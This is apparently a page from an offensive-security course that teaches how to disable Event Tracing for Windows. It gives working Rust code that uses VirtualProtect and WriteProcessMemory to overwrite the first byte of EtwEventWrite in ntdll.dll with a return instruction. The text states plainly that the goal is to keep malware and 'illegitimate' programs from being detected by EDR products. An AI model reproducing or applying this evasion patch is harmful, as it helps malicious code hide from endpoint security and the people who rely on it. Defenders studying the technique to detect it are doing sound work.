+++
title = "Patch ETW"
weight = 9
+++

To detect potential threats, EDRs can collect information on a Windows system. To retrieve this information, EDRs use **ETW** (**Event Tracing for Windows**). ETW is an event-tracking mechanism built into Windows. It is a function for tracing and logging events triggered by applications in user mode and drivers in kernel mode, in a log file. Events can be consumed in real time or from a log file. For example, events can be consumed to debug an application.

In this course, we'll be looking to develop a patch to bypass the ETW function. This will prevent our malware, for example, from being detected by EDRs. Contrary to popular belief, ETW is not that difficult to bypass.
First of all, you need to know that in user mode, ETW-related functions have been implemented in `ntdll.dll` and that ETW can be bypassed during the process.
With this information and by disassembling `ntdll.dll`, we can see that the `EtwEventWrite` function is commonly called when ETW is used by security products.
According to recent research, the `EtwEventWrite` function can be patched by returning a simple return when the function is called. Adam Chester has produced some very interesting documentation on the subject ([https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)).
So we're going to develop a function in Rust, which will enable us to patch the `EtwEventWrite` function. This function can then be added to the code of an illegitimate program to prevent the creation of ETW events, for example.
To do this, you'll need to retrieve the handle of the `ntdll.dll`, and then the address of the `EtwEventWrite` function. In Rust, this can be done using the `GetModuleHandleA` and `GetProcAddress` functions of the windows crate. To save time later on, I'm going to create a path variable containing an array with an immediate return instruction (`ret`).

```rust
let patch = [0xc3];
let handle = GetModuleHandleA(s!("ntdll.dll")).unwrap();
let etw_addr = GetProcAddress(handle, s!("EtwEventWrite")).unwrap();
```

Next, we'll try to change the memory permissions at the address of the `EtwEventWrite` function to enable writing. This step is necessary because we need to be able to obtain write permissions temporarily, to enable the program to write to the location where the `EtwEventWrite` function is stored in memory.

```rust
if VirtualProtect(
    etw_addr as *mut c_void,
    1,
    PAGE_READWRITE,
    &mut old_permissions,
).is_err()
{
    panic!("[-] Failed to change protection.");
}
```

Now that we have the right to write to memory at the address of the `EtwEventWrite` function, we'll write a return instruction at the address of the `EtwEventWrite` function. This instruction replaces the start of the function, resulting in immediate exit without execution of the rest of the function. You can also use the `WriteProcessMemory` function in the windows crate.

```rust
if WriteProcessMemory(
    GetCurrentProcess(),
    etw_addr as *mut c_void,
    patch.as_ptr().cast(),
    1,
    None,
).is_err()
{
    panic!("[-] Failed to overwrite function.");
}
```

All that's left is to restore memory rights to their original state, after our patch has been written. We can reuse the `VirtualProtect` function to do this.

```rust
if VirtualProtect(
    etw_addr as *mut c_void,
    1,
    old_permissions,
    &mut old_permissions,
).is_err()
{
    panic!("[-] Failed to restore permissions.");
}
```

You can add this function to your program to patch the ETW. In the code, you'll find an example of a practical case with the ETW function implemented and working, as well as the function itself.
